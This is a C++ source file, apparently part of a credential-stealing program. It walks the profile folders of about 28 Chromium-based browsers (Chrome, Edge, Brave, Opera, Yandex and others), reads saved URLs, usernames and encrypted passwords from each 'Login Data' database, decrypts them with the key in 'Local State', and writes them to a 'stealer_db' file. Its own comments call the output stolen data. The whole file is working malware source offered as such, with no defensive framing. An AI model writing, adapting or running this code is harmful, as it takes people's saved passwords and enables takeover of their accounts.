#include "ChromiumParser.h"

std::string chromium_paths = "AppData\\Local\\";
std::vector<std::string> browsers_chromium = {
	"Microsoft\\Edge\\",
	"Google\\Chrome\\",
	"Opera Software\\Opera Stable", //Diff, in Roaming
	"Iridium\\",
	"Chromium\\",
	"BraveSoftware\\Brave-Browser\\",
	"CentBrowser\\",
	"Chedot\\",
	"Orbitum\\",
	"Comodo\\Dragon\\",
	"Yandex\\YandexBrowser\\",
	"7Star\\7Star\\",
	"Torch\\",
	"MapleStudio\\ChromePlus\\",
	"Kometo\\",
	"Amigo\\",
	"Sputnik\\Sputnik\\",
	"CatalinaGroup\\Citrio\\",
	"360Chrome\\Chrome\\",
	"uCozMedia\\Uran\\",
	"liebao\\",
	"Elements Browser\\",
	"Epic Privacy Browser\\",
	"CocCoc\\Browser\\",
	"Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
	"QIP Surf\\",
	"Coowon\\Coowon\\",
	"Vivaldi\\"
};

BOOL chromium_parser(std::string username, std::string stealer_db)
{
	//Hold data
	//DataHolder* data_array = new DataHolder[SQLITE_ROW];
	//int data_index = 0;

	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_login_data;
	std::string target_key_data;

	// Those paths that contains \\ at the end means they have the default file 'User Data'
	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if(dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_login_data = target_user_data + "\\Default\\Login Data";
		target_key_data = target_user_data + "\\Local State";

		try {

			sqlite3_stmt* stmt = query_database(target_login_data, "SELECT origin_url, username_value, password_value FROM logins");
			
			if (stmt == nullptr)
				continue;

			//Decrypt Key
			ChromiumDecryptor obj;
			if (obj.ChromiumDecryptorInit(target_key_data))
			{
				//std::cout << target_login_data << std::endl;
				while (sqlite3_step(stmt) == SQLITE_ROW)
				{
					DataHolder data;

					char* url = (char*)sqlite3_column_text(stmt, 0);
					char* username = (char*)sqlite3_column_text(stmt, 1);
					//char* password = (char*)sqlite3_column_text(stmt, 2);					

					std::vector<BYTE> password;
					const void* password_blob = sqlite3_column_blob(stmt, 2);
					int password_blob_size = sqlite3_column_bytes(stmt, 2);

					if (url != nullptr && username != nullptr && password_blob != nullptr && password_blob_size > 0) {
						// Assign the BLOB data to the std::vector<BYTE>
						password.assign((const BYTE*)password_blob, (const BYTE*)password_blob + password_blob_size);

						if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
							continue;


						data.setUrl(url);
						data.setUsername(username);
						data.setHost(dir);

						/*data_array[data_index].setUrl(url);
						data_array[data_index].setUsername(username);
						data_array[data_index].setHost(dir);*/

						try
						{
							//decrypt password here
							std::string decrypted_password = obj.AESDecrypter(password);
							//data_array[data_index++].setPassword(decrypted_password);

							data.setPassword(decrypted_password);

						}
						catch(int e)
						{
							continue;
						}

						data_list.push_back(data);
					}
					else {
						// Handle the case where the password_blob is null (no data)
						continue;
					}
				}
			}
			else
			{
				continue;
			}
		}
		catch (int e)
		{
			continue;
		}		
	}

	// printing stolen data
	/*for (int i = 0; i<data_index; i++)
	{
		data_array[i].print_data();
	}*/


	if (!dump_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

//sqlite3_stmt* query_database(std::string target_login_data, const char* database_query)
//{
//	sqlite3* db;
//	if (sqlite3_open(target_login_data.c_str(), &db) == SQLITE_OK)
//	{
//		//std::cerr << "file found" << std::endl;
//		sqlite3_stmt* stmt = nullptr;
//		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
//		{
//			return stmt;
//		}
//		else
//		{
//			//std::cerr << "Database file in use .... " << std::endl;
//			std::string new_target = target_login_data + "copy";
//			custom_copy_file(target_login_data, new_target);
//			// Do i need sleep here?
//			sqlite3_open(new_target.c_str(), &db);
//			sqlite3_prepare_v2(db, database_query, -1, &stmt, 0);
//
//			return stmt;
//		}
//	}
//	return nullptr;
//}
//
//BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
//	std::ifstream source(sourceFile, std::ios::binary);
//	if (!source) {
//		return false;
//	}
//
//	std::ofstream dest(destinationFile, std::ios::binary);
//	if (!dest) {
//		return false;
//	}
//
//	dest << source.rdbuf();
//
//	if (!dest.good()) {
//		return false;
//	}
//
//	//std::cout << "File copied successfully." << std::endl;
//	return true;
//}

//bool dump_data(const std::string& db_path, DataHolder* data_array, int data_index) {
//	sqlite3* db;
//	char* errorMessage = nullptr;
//
//	// Open the database
//	int rc = sqlite3_open(db_path.c_str(), &db);
//	if (rc) {
//		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
//		return false;
//	}
//
//	// Create table if it doesn't exist
//	const char* createTableSQL = "CREATE TABLE IF NOT EXISTS logins ("
//		"id INTEGER PRIMARY KEY AUTOINCREMENT,"
//		"url TEXT NOT NULL,"
//		"username TEXT NOT NULL,"
//		"password TEXT NOT NULL"
//		");";
//
//	rc = sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errorMessage);
//	if (rc != SQLITE_OK) {
//		//std::cerr << "SQL error: " << errorMessage << std::endl;
//		sqlite3_free(errorMessage);
//		sqlite3_close(db);
//		return false;
//	}
//
//	// Prepare insert statement
//	const char* insertSQL = "INSERT INTO logins (url, username, password) VALUES (?, ?, ?);";
//	sqlite3_stmt* stmt;
//
//	rc = sqlite3_prepare_v2(db, insertSQL, -1, &stmt, nullptr);
//	if (rc != SQLITE_OK) {
//		//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
//		sqlite3_close(db);
//		return false;
//	}
//
//	std::string url_string;
//	std::string username_string;
//	std::string password_string;
//
//	// Bind the data and execute the statement
//	for (int i = 0; i < data_index; ++i) {
//
//		//c_str() doesn't work directly on function returns. It works with pointers
//		url_string = data_array[i].getUrl();
//		username_string = data_array[i].getUsername();
//		password_string = data_array[i].getPassword();
//
//		sqlite3_bind_text(stmt, 1, url_string.c_str(), -1, SQLITE_STATIC);
//		sqlite3_bind_text(stmt, 2, username_string.c_str(), -1, SQLITE_STATIC);
//		sqlite3_bind_text(stmt, 3, password_string.c_str(), -1, SQLITE_STATIC);
//
//		rc = sqlite3_step(stmt);
//		if (rc != SQLITE_DONE) {
//			//std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
//			sqlite3_finalize(stmt);
//			sqlite3_close(db);
//			return false;
//		}
//
//		// Reset the statement for the next iteration
//		sqlite3_reset(stmt);
//	}
//
//	// Clean up
//	sqlite3_finalize(stmt);
//	sqlite3_close(db);
//	std::cout << "Data dump: " << db_path << std::endl;
//	return true;
//}
